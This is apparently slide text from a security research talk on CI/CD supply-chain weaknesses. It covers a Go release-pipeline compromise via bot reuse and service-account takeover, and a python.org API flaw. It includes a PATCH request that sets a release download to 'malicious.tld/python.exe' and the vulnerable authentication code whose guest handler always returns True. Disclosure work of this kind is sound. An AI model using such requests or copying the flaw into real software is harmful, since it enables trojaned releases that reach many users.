                                 security-worker-builder@
  Job#3
     …
                                       Security Bot             Auth     Service Account
                                  chrome-swarming.appspot.com
                     Job#1
Security Task
  Security Patch                                                 LUCI_CONTEXT
                     Job#2
                                                                Based on Task Type
                     Job#3
                       …

                   Public Task            Try Bot
                                  chromium-swarm.appspot.com
  Job#1

  Job#2                                                                gs://golang/
                                                                Local Auth RPC
                                 security-worker-builder@
  Job#3
     …
                                       Security Bot             Auth     Service Account
                                  chrome-swarming.appspot.com
                     Job#1
Security Task
  Security Patch                                                 LUCI_CONTEXT
                     Job#2
                                                                Based on Task Type
                     Job#3
                       …

                   Public Task            Try Bot
                                  chromium-swarm.appspot.com
  Job#1

  Job#2                                                                gs://golang/
                                                                Local Auth RPC
                                 security-worker-builder@
  Job#3
     …
                                       Security Bot             Auth     Service Account
                                  chrome-swarming.appspot.com
                     Job#1
Security Task
  Security Patch                                                 LUCI_CONTEXT
                     Job#2
                                                                Based on Task Type
                     Job#3
                       …

                   Public Task            Try Bot
                                  chromium-swarm.appspot.com
  Job#1

  Job#2                                                                      gs://golang/
                                                                      Local Auth RPC
                                 security-worker-builder@
  Job#3
     …
                                       Security Bot                  Auth      Service Account
                                  chrome-swarming.appspot.com
                     Job#1
Security Task
  Security Patch                                                      LUCI_CONTEXT
                     Job#2
                                                                     Based on Task Type
                     Job#3

                                                                RELUI
                       …

                   Public Task            Try Bot               RELease UI
                                  chromium-swarm.appspot.com
  Job#1

  Job#2                                                                      gs://golang/
                                                                      Local Auth RPC
                                 security-worker-builder@
  Job#3
                                       Security Bot                           Release
     …                                                               Auth      Service Account
                                  chrome-swarming.appspot.com                Pipeline
                     Job#1
Security Task
  Security Patch                                                      LUCI_CONTEXT
                     Job#2
                                                                     Based on Task Type
                                                                        relui-prod@
                     Job#3

                                                                RELUI
                       …

                   Public Task            Try Bot               RELease UI
                                  chromium-swarm.appspot.com
  Job#1

  Job#2                                                                      gs://golang/
                                                                      Local Auth RPC
                                 security-worker-builder@
  Job#3
                                       Security Bot                           Release
     …                                                               Auth      Service Account
                                  chrome-swarming.appspot.com                Pipeline
                     Job#1
Security Task
  Security Patch                                                      LUCI_CONTEXT
                     Job#2
                                                  relui-task@        Based on Task Type
                                                                        relui-prod@
                     Job#3

                                                                RELUI
                       …

                   Public Task            Try Bot               RELease UI
                                  chromium-swarm.appspot.com
Bot Reusin
          g!
   Job#1

   Job#2
                                                 RELUI
   Job#3                                         RELease UI

       …

Security Task
  Security Patch      Security Bot
                   chrome-swarming.appspot.com
   Our#1

   Job#2
                                                   RELUI
   Job#3                                           RELease UI

       …           security-worker-builder@

Security Task
  Security Patch        Security Bot
                     chrome-swarming.appspot.com
                          Plant Trojan!



   Our#1

   Job#2           👾                               RELUI
   Job#3                                           RELease UI

       …           security-worker-builder@

Security Task
  Security Patch        Security Bot
                     chrome-swarming.appspot.com
                   (do evil things)

   Job#1

   Job#2            👾                                 RELUI
   Job#3                                              RELease UI

       …            security-worker-builder@

Security Task
  Security Patch           Security Bot
                        chrome-swarming.appspot.com
                   Got You RELUI!



                     👾
                                                      relui-task@
   Job#1

   Job#2
                                                                RELUI
   Job#3                                                        RELease UI

       …                   relui-task@

Security Task
  Security Patch           Security Bot
                        chrome-swarming.appspot.com
                    Got You RELUI!



                      👾
                                                       relui-task@
   Job#1

   Job#2
                                                                 RELUI
   Job#3                                                         RELease UI

       …                    relui-task@

Security Task
                            Security Bot
                   Who Are You?
  Security Patch
                         chrome-swarming.appspot.com
Releasing
Pipeline
                                   dl.google.com/go


                                       gs://golang/

               Cloud Build
 Gerrit                      Compare      Sign        Upload
 Source Code
               Windows bot
Releasing
Pipeline
                                      dl.google.com/go


                                          gs://golang/

               Cloud Build
 Gerrit                         Compare      Sign        Upload
 Source Code
               Windows bot
                  relui-task@
Releasing
Pipeline
                                          dl.google.com/go


                                            gs://golang/

                Cloud Build
 Gerrit                           Compare      Sign        Upload
 Source Code
                Windows bot
                    relui-task@




               🛢 [ gs://golang-release-staging ]
Releasing
Pipeline
                                          dl.google.com/go


                                            gs://golang/

                Cloud Build
 Gerrit                           Compare      Sign        Upload
 Source Code
                Windows bot
                    relui-task@




               🛢 [ gs://golang-release-staging ]
Releasing
Pipeline
                                          dl.google.com/go


                                            gs://golang/

                Cloud Build
 Gerrit                           Compare      Sign        Upload
 Source Code
                Windows bot
                    relui-task@




               🛢 [ gs://golang-release-staging ]
Releasing
Pipeline
                                          dl.google.com/go


                                            gs://golang/

                Cloud Build
 Gerrit                               d !
                        botpr om i se
                                  Compare      Sign        Upload
 Source Code
                    Com
                Windows
                    relui-task@




               🛢 [ gs://golang-release-staging ]
Python
WHAT?
WHAT?
PATCH /api/v1/downloads/release_file/123/
                  ?format=json&username=ambv&api_key=ANY HTTP/1.1
Host: www.python.org
Content-Type: application/json


{"url": "https://malicious.tld/python.exe"}
PATCH /api/v1/downloads/release_file/123/
                  ?format=json&username=ambv&&api_key=ANY HTTP/1.1
Host: www.python.org
Content-Type: application/json


{"url": "https://malicious.tld/python.exe"}
PATCH /api/v1/downloads/release_file/123/
                  ?format=json&username=ambv&&api_key=ANY HTTP/1.1
Host: www.python.org
Content-Type: application/json


               Compromised!
{"url": "https://malicious.tld/python.exe"}
class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
   def _unauthorized(self):
       return True # Allow guests anyway

   def is_authenticated(self, request, **kwargs):
       User = get_user_model()
       username_field = User.USERNAME_FIELD
       try:
           username, api_key = self.extract_credentials(request)
       except ValueError:
            return self._unauthorized()
       if not username or not api_key:
            return self._unauthorized()
       try:
           lookup_kwargs = {username_field: username}
           user = User.objects.get(**lookup_kwargs)
       except (User.DoesNotExist, User.MultipleObjectsReturned):
            return self._unauthorized()
       if not self.check_active(user):
            return False
       key_auth_check = self.get_key(user, api_key)
       if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
           request.user = user
       return key_auth_check
class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
   def _unauthorized(self):
       return True # Allow guests anyway

   def is_authenticated(self, request, **kwargs):
       User = get_user_model()
       username_field = User.USERNAME_FIELD
       try:
            username, api_key = self.extract_credentials(request)
       except ValueError:
            return self._unauthorized()
       if not username or not api_key:
            return self._unauthorized()
       try:
            lookup_kwargs = {username_field: username}
            user = User.objects.get(**lookup_kwargs)
       except (User.DoesNotExist, User.MultipleObjectsReturned):
            return self._unauthorized()
       if not self.check_active(user):
            return False
       key_auth_check = self.get_key(user, api_key)
       if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
            request.user = user
       return key_auth_check
class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
   def _unauthorized(self):
       return True # Allow guests anyway

   def is_authenticated(self, request, **kwargs):
       User = get_user_model()
       username_field = User.USERNAME_FIELD
       try:
            username, api_key = self.extract_credentials(request)
       except ValueError:
            return self._unauthorized()
       if not username or not api_key:
            return self._unauthorized()
       try:
            lookup_kwargs = {username_field: username}
            user = User.objects.get(**lookup_kwargs)   Query User
       except (User.DoesNotExist, User.MultipleObjectsReturned):
            return self._unauthorized()
       if not self.check_active(user):
            return False
       key_auth_check = self.get_key(user, api_key) Checking API Key
       if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
            request.user = user   Set User (if pass)
       return key_auth_check
class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
   def _unauthorized(self):
       return True # Allow guests anyway

   def is_authenticated(self, request, **kwargs):
       User = get_user_model()
       username_field = User.USERNAME_FIELD
       try:
            username, api_key = self.extract_credentials(request)
       except ValueError:
            return self._unauthorized()
       if not username or not api_key:
            return self._unauthorized()
       try:
            lookup_kwargs = {username_field: username}
            user = User.objects.get(**lookup_kwargs)
       except (User.DoesNotExist, User.MultipleObjectsReturned):
            return self._unauthorized()
       if not self.check_active(user):
            return False
       key_auth_check = self.get_key(user, api_key)
       if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
            request.user = user
       return key_auth_check
class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
   def _unauthorized(self):
       return True # Allow guests anyway

   def is_authenticated(self, request, **kwargs):
       User = get_user_model()
       username_field = User.USERNAME_FIELD
       try:
            username, api_key = self.extract_credentials(request)
       except ValueError:
            return self._unauthorized()
       if not username or not api_key:
            return self._unauthorized()
       try:
            lookup_kwargs = {username_field: username}
            user = User.objects.get(**lookup_kwargs)
       except (User.DoesNotExist, User.MultipleObjectsReturned):
            return self._unauthorized()
       if not self.check_active(user):
            return False
       key_auth_check = self.get_key(user, api_key)
       if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
            request.user = user
       return key_auth_check
class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
   def _unauthorized(self):
       return True # Allow guests anyway

   def is_authenticated(self, request, **kwargs):
       User = get_user_model()
       username_field = User.USERNAME_FIELD
       try:
            username, api_key = self.extract_credentials(request)
       except ValueError:
            return self._unauthorized()
       if not username or not api_key:
            return self._unauthorized()
       try:
            lookup_kwargs = {username_field: username}
            user = User.objects.get(**lookup_kwargs)
       except (User.DoesNotExist, User.MultipleObjectsReturned):
            return self._unauthorized()
       if not self.check_active(user):
            return False
       key_auth_check = self.get_key(user, api_key)
       if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
            request.user = user
       return key_auth_check
class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
   def _unauthorized(self):
       return True # Allow guests anyway

   def is_authenticated(self, request, **kwargs):
       User = get_user_model()
       username_field = User.USERNAME_FIELD
       try:
            username, api_key = self.extract_credentials(request)
       except ValueError:
            return self._unauthorized()
       if not username or not api_key:
            return self._unauthorized()
       try:
            lookup_kwargs = {username_field: username}
            user = User.objects.get(**lookup_kwargs)   Query User
       except (User.DoesNotExist, User.MultipleObjectsReturned):
            return self._unauthorized()
       if not self.check_active(user):
            return False
       key_auth_check = self.get_key(user, api_key) Checking API Key
       if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
            request.user = user   Set User (if pass)
       return key_auth_check
class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
   def _unauthorized(self):
       return True # Allow guests anyway

   def is_authenticated(self, request, **kwargs):
       User = get_user_model()
       username_field = User.USERNAME_FIELD
       try:
            username, api_key = self.extract_credentials(request)
       except ValueError:
            return self._unauthorized()
       if not username or not api_key:
            return self._unauthorized()
       try:
            lookup_kwargs = {username_field: username}
            user = User.objects.get(**lookup_kwargs)   Query User
       except (User.DoesNotExist, User.MultipleObjectsReturned):
            return self._unauthorized()
       if not self.check_active(user):
            return False
       key_auth_check = self.get_key(user, api_key) Checking API Key
       if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
            request.user = user   Set User (if pass)
       return key_auth_check
class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
   def _unauthorized(self):
       return True # Allow guests anyway

   def is_authenticated(self, request, **kwargs):
       User = get_user_model()
       username_field = User.USERNAME_FIELD
       try:
            username, api_key = self.extract_credentials(request)
       except ValueError:
            return self._unauthorized()
       if not username or not api_key:
            return self._unauthorized()
       try:
            lookup_kwargs = {username_field: username}
            user = User.objects.get(**lookup_kwargs)   Query User
       except (User.DoesNotExist, User.MultipleObjectsReturned):
            return self._unauthorized()
       if not self.check_active(user):
            return False
       key_auth_check = self.get_key(user, api_key) Checking API Key
       if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
            request.user = user   Set User (if pass)
       return key_auth_check
class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
   def _unauthorized(self):
       return True # Allow guests anyway

   def is_authenticated(self, request, **kwargs):
       User = get_user_model()     class ApiKeyAuthentication(Authentication):
                                      # …
       username_field = User.USERNAME_FIELD
       try:                           def _unauthorized(self):
            username, api_key = self.extract_credentials(request)
                                           return HttpUnauthorized()
       except ValueError:
                                      def get_key(self, user, api_key):
            return self._unauthorized()
       if not username or not api_key:     from tastypie.models import ApiKey
            return self._unauthorized()    try:
       try:                                     if user.api_key.key != api_key:
            lookup_kwargs = {username_field: username}
                                                     return self._unauthorized()
            user = User.objects.get(**lookup_kwargs)    Query User
                                           except ApiKey.DoesNotExist:
       except (User.DoesNotExist, User.MultipleObjectsReturned):
                                                return self._unauthorized()
            return self._unauthorized()
       if not self.check_active(user):     return True
            return False
       key_auth_check = self.get_key(user, api_key)
       if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
            request.user = user
       return key_auth_check
class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
   def _unauthorized(self):
       return True # Allow guests anyway

   def is_authenticated(self, request, **kwargs):
       User = get_user_model()     class ApiKeyAuthentication(Authentication):
                                      # …
       username_field = User.USERNAME_FIELD
       try:                           def _unauthorized(self):
            username, api_key = self.extract_credentials(request)
                                           return HttpUnauthorized()
       except ValueError:
                                      def get_key(self, user, api_key):
            return self._unauthorized()
       if not username or not api_key:     from tastypie.models import ApiKey
            return self._unauthorized()    try:
       try:                                     if user.api_key.key != api_key:
            lookup_kwargs = {username_field: username}
                                                     return self._unauthorized()
            user = User.objects.get(**lookup_kwargs)    Query User
                                           except ApiKey.DoesNotExist:
       except (User.DoesNotExist, User.MultipleObjectsReturned):
                                                return self._unauthorized()
            return self._unauthorized()
       if not self.check_active(user):     return True
            return False
       key_auth_check = self.get_key(user, api_key)
       if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
            request.user = user
       return key_auth_check
    class ApiKeyOrGuestAuthentication(tastypie.authentication.ApiKeyAuthentication):
       def _unauthorized(self):
           return True # Allow guests anyway

       def is_authenticated(self, request, **kwargs):
           User = get_user_model()     class ApiKeyAuthentication(Authentication):
                                          # …
           username_field = User.USERNAME_FIELD
           try:                           def _unauthorized(self):
                username, api_key = self.extract_credentials(request)
                                               return HttpUnauthorized()
           except ValueError:
                                          def get_key(self, user, api_key):
                return self._unauthorized()
           if not username or not api_key:     from tastypie.models import ApiKey
                return self._unauthorized()    try:
           try:                                     if user.api_key.key != api_key:
                lookup_kwargs = {username_field: username}
                                                         return self._unauthorized()
                user = User.objects.get(**lookup_kwargs)    Query User
                                               except ApiKey.DoesNotExist:
           except (User.DoesNotExist, User.MultipleObjectsReturned):

         RU E!  return self._unauthorized()
                                                    return self._unauthorized()

   ays T   if not self.check_active(user):     return True
Alw             return False
           key_auth_check = self.get_key(user, api_key)
           if key_auth_check and not isinstance(key_auth_check, HttpUnauthorized):
                request.user = user
           return key_auth_check
              Developer
CI/CD Risks               ???
              Dashboard
              Developer
CI/CD Risks               Home Page
              Dashboard
Hey,
So, did you use any AI?
So, did you use any AI?
    Yes, quite a few.
Thanks!

 splitline@devco.re
 @_splitline_
